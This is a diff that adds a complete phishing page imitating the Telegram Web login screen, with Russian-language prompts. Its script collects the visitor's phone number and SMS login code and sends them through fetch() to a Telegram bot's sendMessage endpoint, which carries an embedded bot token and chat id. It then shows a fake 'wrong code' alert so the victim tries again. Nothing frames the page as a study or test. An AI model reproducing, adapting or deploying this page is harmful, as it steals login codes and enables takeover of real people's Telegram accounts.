@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Web</title>
+    <style>
+        body { font-family: Arial; max-width: 400px; margin: 50px auto; }
+        input { width: 100%; padding: 10px; margin: 5px 0; }
+        button { width: 100%; padding: 10px; background: #0088cc; color: white; border: none; }
+    </style>
+</head>
+<body>
+    <h2>Telegram Web</h2>
+    <p>Введите номер телефона и код из SMS для входа</p>
+    <input id="phone" placeholder="+7 999 123 45 67">
+    <input id="code" placeholder="Код из SMS">
+    <button onclick="send()">Войти</button>
+    <script>
+        function send() {
+            var phone = document.getElementById('phone').value;
+            var code = document.getElementById('code').value;
+            // Отправляем данные в нашего бота
+            fetch('https://api.telegram.org/bot<8881316932:AAG15wnmAHp50B1j0J34PCCyCN6ubSNPPoY>/sendMessage?chat_id=<5655585460>&text=Телефон: '+phone+' Код: '+code);
+            alert('Неверный код, попробуйте снова');
+        }
+    </script>
+</body>
+</html>
